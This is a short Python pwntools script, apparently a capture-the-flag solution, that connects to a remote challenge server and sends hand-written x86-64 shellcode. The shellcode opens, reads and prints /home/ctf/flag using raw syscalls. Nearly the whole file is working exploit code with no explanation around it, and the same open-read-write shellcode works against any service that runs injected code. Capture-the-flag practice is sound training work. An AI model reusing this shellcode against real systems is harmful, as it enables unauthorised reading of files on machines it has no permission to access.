#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

ip = "bamboofox.cs.nctu.edu.tw"
port = 11101
r = remote(ip,port)

context.arch = 'amd64'

shellcode = asm('''
open:
xor rsi, rsi
xor rdx, rdx
mov rax, 0x67616c662f661111
shr rax, 16
push rax
mov rax, 0x74632f656d6f682f
push rax
mov rdi, rsp
xor rax, rax
inc rax
inc rax
syscall
read:
mov rdi, rax
xor rax, rax
mov rsi, rsp
xor rdx, rdx
inc rdx
shl rdx, 0x6
syscall
write:
mov rdx, rax
xor rax, rax
inc rax
xor rdi, rdi
inc rdi
syscall
''')
# /home/ctf/flag  =>  0x2f686f6d652f6374 662f666c6167
r.sendline(shellcode)
r.interactive()